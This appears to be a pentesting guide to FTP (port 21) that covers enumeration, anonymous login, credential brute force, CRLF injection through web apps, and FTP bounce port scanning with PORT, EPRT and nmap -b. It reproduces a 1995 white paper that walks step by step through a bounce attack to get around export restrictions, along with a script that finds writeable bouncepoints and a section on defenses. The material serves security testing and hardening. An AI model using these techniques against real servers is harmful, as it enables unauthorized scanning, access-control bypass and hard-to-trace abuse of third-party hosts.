21 - Pentesting FTP
Basic Information

The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client and server on a computer network.
It is a plain-text protocol that uses as new line character 0x0d 0x0a so it's important to connect using telnet instead of nc.

Default Port: 21

PORT   STATE SERVICE
21/tcp open  ftp

Enumeration
Banner Grabbing

telnet -vn <IP> 21
openssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any

Unauth enum

You can us the commands HELP and FEAT to obtain some information of the FTP server:

HELP
214-The following commands are recognized (* =>'s unimplemented):
214-CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
214-EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
214-XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
214-NOOP    FEAT    OPTS    AUTH    CCC*    CONF*   ENC*    MIC*    
214-PBSZ    PROT    TYPE    STRU    MODE    RETR    STOR    STOU    
214-APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
214-NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root@drei.work
FEAT
211-Features:
 PROT
 CCC
 PBSZ
 AUTH TLS
 MFF modify;UNIX.group;UNIX.mode;
 REST STREAM
 MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
 UTF8
 EPRT
 EPSV
 LANG en-US
 MDTM
 SSCN
 TVFS
 MFMT
 SIZE
211 End

Connections

In Active FTP the FTP client first initiates the control connection from its port N to FTP Servers command port – port 21. The client then listens to port N+1 and sends the port N+1 to FTP Server. FTP Server then initiates the data connection, from its port M to the port N+1 of the FTP Client.

But, if the FTP Client has a firewall setup that controls the incoming data connections from outside, then active FTP may be a problem. And, a feasible solution for that is Passive FTP.

In Passive FTP, the client initiates the control connection from its port N to the port 21 of FTP Server. After this, the client issues a passv comand. The server then sends the client one of its port number M. And the client initiates the data connection from its port P to port M of the FTP Server.

Source: https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/​
Anonymous login

anonymous : anonymous
anonymous : 
ftp : ftp

ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit

​Brute force​

Here you can find a nice list with default ftp credentials: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt​
Automated

Anon login and bounce FTP checks are perform by default by nmap with -sC option.
Shodan

    ftp

    port:21

Browser connection

You can connect to a FTP server using a browser (like Firefox) using a URL like: 

ftp://anonymous:anonymous@10.10.10.98

Note that if a web application is sending data controlled by a user directly to a FTP server you can send double URL encode %0d%0a (in double URL encode this is %250d%250a) bytes and make the FTP server perform arbitrary actions. One of this possible arbitrary actions is to download content from a users controlled server, perform port scanning or try to talk to other plain-text based services (like http).
Download all files from FTP

wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all

Some FTP commands

    USER username

    PASS password

    HELP The server indicates which commands are supported

    PORT 127,0,0,1,0,80This will indicate the FTP server to establish a connection with the IP 127.0.0.1 in port 80 (you need to put the 5th char as "0" and the 6th as the port in decimal or use the 5th and 6th to express the port in hex).

    EPRT |2|127.0.0.1|80|This will indicate the FTP server to establish a TCP connection (indicated by "2") with the IP 127.0.0.1 in port 80. This command supports IPv6.

    LIST This will send the list of files in current folder

    APPE /path/something.txt This will indicate the FTP to store the data received from a passive connection or from a PORT/EPRT connection to a file. If the filename exists, it will append the data.

    STOR /path/something.txt Like APPE but it will overwrite the files

    STOU /path/something.txt Like APPE, but if exists it won't do anything.

    RETR /path/to/file A passive or a port connection must be establish. Then, the FTP server will send the indicated file through that connection

    REST 6 This will indicate the server that next time it send something using RETR it should start in the 6th byte.

    TYPE i Set transfer to binary

    PASV This will open a passive connection and will indicate the user were he can connects 

FTPBounce attack

Some FTP servers allow the command PORT. This command can be used to indicate to the server that you wants to connect to other FTP server at some port. Then, you can use this to scan which ports of a host are open through a FTP server.

​Learn here how to abuse a FTP server to scan ports.​

You could also abuse this behaviour to make a FTP server interact with other protocols. You could upload a file containing an HTTP request and make the vulnerable FTP server send it to an arbitrary HTTP server (maybe to add a new admin user?) or even upload a FTP request and make the vulnerable FTP server download a file for a different FTP server. 
The theory is easy:

    Upload the request (inside a text file) to the vulnerable server. Remember that if you want to talk with another HTTP or FTP server you need to change lines with 0x0d 0x0a

    Use REST X to avoid sending the characters you don't want to send (maybe to upload the request inside the file you needed to put some image header at the begging)

    Use PORTto connect to the arbitrary server and service 

    Use RETRto send the saved request to the server. 

Its highly probably that this will throw an error like Socket not writable because the connection doesn't last enough to send the data with RETR. Suggestions to try to avoid that are:

    If you are sending an HTTP request, put the same request one after another until ~0.5MB at least. Like this: 

posts.txt
posts.txt - 495KB

    Try to fill the request with "junk" data relative to the protocol (talking to FTP maybe just junk commands or repeating the RETRinstruction to get the file)

    Just fill the request with a lot of null characters or others (divided on lines or not)

Anyway, here you have an old example about how to abuse this to make a FTP server download a file from a different FTP server.​
Filezilla Server Vulnerability

FileZilla usually binds to local an Administrative service for the FileZilla-Server (port 14147). If you can create a tunnel from your machine to access this port, you can connect to it using a blank password and create a new user for the FTP service.
Config files

ftpusers
ftp.conf
proftpd.conf

FTP Bounce attack - Scan
FTP Bounce - Scanning
Manual

    Connect to vulnerable FTP

    Use PORTor EPRT(but only 1 of them) to make it establish a connection with the <IP:Port> you want to scan:

    PORT 172,32,80,80,0,8080
    EPRT |2|172.32.80.80|8080|

    Use LIST(this will just send to the connected <IP:Port> the list of current files in the FTP folder) and check for the possible responses: 150 File status okay (This means the port is open) or 425 No connection established (This means the port is closed)

        Instead of LIST you could also use RETR /file/in/ftp and look for similar Open/Close responses.

Example Using PORT (port 8080 of 172.32.80.80 is open and port 7777 is closed):

Same example using EPRT(authentication omitted in the image):

Open port using EPRT instead of LIST (different env)
nmap

nmap -b <name>:<pass>@<ftp_server> <victim>
nmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1 #Scan ports 21,80 of the FTP
nmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24 #Scan the internal network (of the FTP) ports 21,22,445,80

FTP Bounce - Download 2ºFTP file
Resume

If you have access to a bounce FTP server, you can make it request files of other FTP server (where you know some credentials) and download that file to your own server.
Requirements

FTP valid credentials in the FTP Middle server
FTP valid credentials in Victim FTP server
Both server accepts the PORT command (bounce FTP attack)
You can write inside some directory of the FRP Middle server
The middle server will have more access inside the Victim FTP Server than you for some reason (this is what you are going to exploit) 
Steps

    Connect to your own FTP server and make the connection passive (pasv command) to make it listen in a directory where the victim service will send the file

    Make the file that is going to send the FTP Middle server t the Victim server (the exploit). This file will be a plaint text of the needed commands to authenticate against the Victim server, change the directory and download a file to your own server.

    Connect to the FTP Middle Server and upload de previous file

    Make the FTP Middle server establish a connection with the victim server and send the exploit file

    Capture the file in your own FTP server

    Delete the exploit file from the FTP Middle server

​

All the info in this post was extracted from: http://www.ouah.org/ftpbounce.html​
 The FTP Bounce Attack

This discusses one of many possible uses of the "FTP server bounce attack". The mechanism used is probably well-known, but to date interest in detailing or fixing it seems low to nonexistent. This particular example demonstrates yet another way in which most electronically enforced "export restrictions" are completely useless and trivial to bypass. It is chosen in an effort to make the reader sit up and notice that there are some really ill-conceived aspects of the standard FTP protocol.

 Thanks also to Alain Knaff at imag.fr for a brief but entertaining discussion of some of these issues a couple of months ago which got me thinking more deeply about them.
 The motive

You are a user on foreign.fr, IP address F.F.F.F, and want to retrieve cryptographic source code from crypto.com in the US. The FTP server at crypto.com is set up to allow your connection, but deny access to the crypto sources because your source IP address is that of a non-US site [as near as their FTP server can determine from the DNS, that is]. In any case, you cannot directly retrieve what you want from crypto.com's server.

 However, crypto.com will allow ufred.edu to download crypto sources because ufred.edu is in the US too. You happen to know that /incoming on ufred.edu is a world-writeable directory that any anonymous user can drop files into and read them back from. Crypto.com's IP address is C.C.C.C.
 The attack

 This assumes you have an FTP server that does passive mode. Open an FTP connection to your own machine's real IP address [not localhost] and log in. Change to a convenient directory that you have write access to, and then do:

pasv
stor foobar

 Take note of the address and port that are returned from the PASV command, F,F,F,F,X,X. This FTP session will now hang, so background it or flip to another window or something to proceed with the rest of this.

 Construct a file containing FTP server commands. Let's call this file "instrs". It will look like this:

user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...

 F,F,F,F,X,X is the same address and port that your own machine handed you on the first connection. The trash at the end is extra lines you create, each containing 250 NULLS and nothing else, enough to fill up about 60K of extra data. The reason for this filler is explained later.

 Open an FTP connection to ufred.edu, log in anonymously, and cd to /incoming. Now type the following into this FTP session, which transfers a copy of your "instrs" file over and then tells ufred.edu's FTP server to connect to crypto.com's FTP server using your file as the commands:

put instrs
port C,C,C,C,0,21
retr instrs

 Crypto.tar.Z should now show up as "foobar" on your machine via your first FTP connection. If the connection to ufred.edu didn't die by itself due to an apparently common server bug, clean up by deleting "instrs" and exiting. Otherwise you'll have to reconnect to finish.
 Discussion

There are several variants of this. Your PASV listener connection can be opened on any machine that you have file write access to -- your own, another connection to ufred.edu, or somewhere completely unrelated. In fact, it does not even have to be an FTP server -- any utility that will listen on a known TCP port and read raw data from it into a file will do. A passive-mode FTP data connection is simply a convenient way to do this.

 The extra nulls at the end of the command file are to fill up the TCP windows on either end of the ufred -> crypto connection, and ensure that the command connection stays open long enough for the whole session to be executed. Otherwise, most FTP servers tend to abort all transfers and command processing when the control connection closes prematurely. The size of the data is enough to fill both the receive and transmit windows, which on some OSes are quite large [on the order of 30K]. You can trim this down if you know what OSes are on either end and the sum of their default TCP window sizes. It is split into lines of 250 characters to avoid overrunning command buffers on the target server -- probably academic since you told the server to quit already.

 If crypto.com disallows *any* FTP client connection from you at foreign.fr and you need to see what files are where, you can always put "list -aR" in your command file and get a directory listing of the entire tree via ufred.

 You may have to retrieve your command file to the target's FTP server in ASCII mode rather than binary mode. Some FTP servers can deal with raw newlines, but others may need command lines terminated by CRLF pairs. Keep this in mind when retrieving files to daemons other than FTP servers, as well.
 Other possbilities

 Despite the fact that such third-party connections are one-way only, they can be used for all kinds of things. Similar methods can be used to post virtually untraceable mail and news, hammer on servers at various sites, fill up disks, try to hop firewalls, and generally be annoying and hard to track down at the same time. A little thought will bring realization of numerous other scary possibilities.

 Connections launched this way come from source port 20, which some sites allow through their firewalls in an effort to deal with the "ftp-data" problem. For some purposes, this can be the next best thing to source-routed attacks, and is likely to succeed where source routing fails against packet filters. And it's all made possible by the way the FTP protocol spec was written, allowing control connections to come from anywhere and data connections to go anywhere.
 Defenses

 There will always be sites on the net with creaky old FTP servers and writeable directories that allow this sort of traffic, so saying "fix all the FTP servers" is the wrong answer. But you can protect your own against both being a third-party bouncepoint and having another one used against you.

 The first obvious thing to do is allow an FTP server to only make data connections to the same host that the control connection originated from. This does not prevent the above attack, of course, since the PASV listener could just as easily be on ufred.edu and thus meet that requirement, but it does prevent *your* site from being a potential bouncepoint. It also breaks the concept of "proxy FTP", but hidden somewhere in this paragraph is a very tiny violin.

 The next obvious thing is to prohibit FTP control connections that come from reserved ports, or at least port 20. This prevents the above scenario as stated.

 Both of these things, plus the usual poop about blocking source-routed packets and other avenues of spoofery, are necessary to prevent hacks of this sort. And think about whether or not you really need an open "incoming" directory.

 Only allowing passive-mode client data connections is another possibility, but there are still too many FTP clients in use that aren't passive-aware.
 "A loose consensus and running code"

 There is some existing work addressing this available here at avian.org [and has been for several months, I might add] in the "fixkits archive". Several mods to wu-ftpd-2.4 are presented, which includes code to prevent and log attempts to use bogus PORT commands. Recent security fixes from elsewhere are also included, along with s/key support and various compile-time options to beef up security for specific applications.

 Stan Barber at academ.com is working on merging these and several other fixes into a true updated wu-ftpd release. There are a couple of other divergent efforts going on. Nowhere is it claimed that any of this work is complete yet, but it is a start toward something I have had in mind for a while -- a network-wide release of wu-ftpd-2.5, with contributions from around the net. The wu-ftpd server has become very popular, but is in sad need of yet another security upgrade. It would be nice to pull all the improvements together into one coordinated place, and it looks like it will happen. All of this still won't help people who insist on running vendor-supplied servers, of course.

 Sanity-checking the client connection's source port is not implemented specifically in the FTP server fixes, but in modifications to Wietse's tcp-wrappers package since this problem is more general. A simple PORT option is added that denies connections from configurable ranges of source ports at the tcpd stage, before a called daemon is executed.

 Some of this is pointed to by /src/fixkits/README in the anonymous FTP area here. Read this roadmap before grabbing other things.
 Notes

 Adding the nulls at the end of the command file was the key to making this work against a variety of daemons. Simply sending the desired data would usually fail due to the immediate close signaling the daemon to bail out.

 If WUSTL has not given up entirely on the whole wu-ftpd project, they are keeping very quiet about further work. Bryan O'Connor appears to have many other projects to attend to by now...

 This is a trivial script to find world-writeable and ftp-owned directories and files on a unix-based anonymous FTP server. You'd be surprised how many of those writeable "bouncepoints" pop out after a short run of something like this. You will have to later check that you can both PUT and GET files from such places; some servers protect uploaded files against reading. Many do not, and then wonder why they are among this week's top ten warez sites...

#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
  BEGIN { idir = "/" ; dirp = 0 }
  /.:$/ { idir = $0 ; dirp = 1 ; }
  /^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
    if (dirp == 1) print idir
    dirp = 0
    print $0
  } '
rm xxx.$$

 I suppose one could call this a white paper. It is up for grabs at avian.org in /random/ftp-attack as well as being posted in various relevant places. _H* 950712



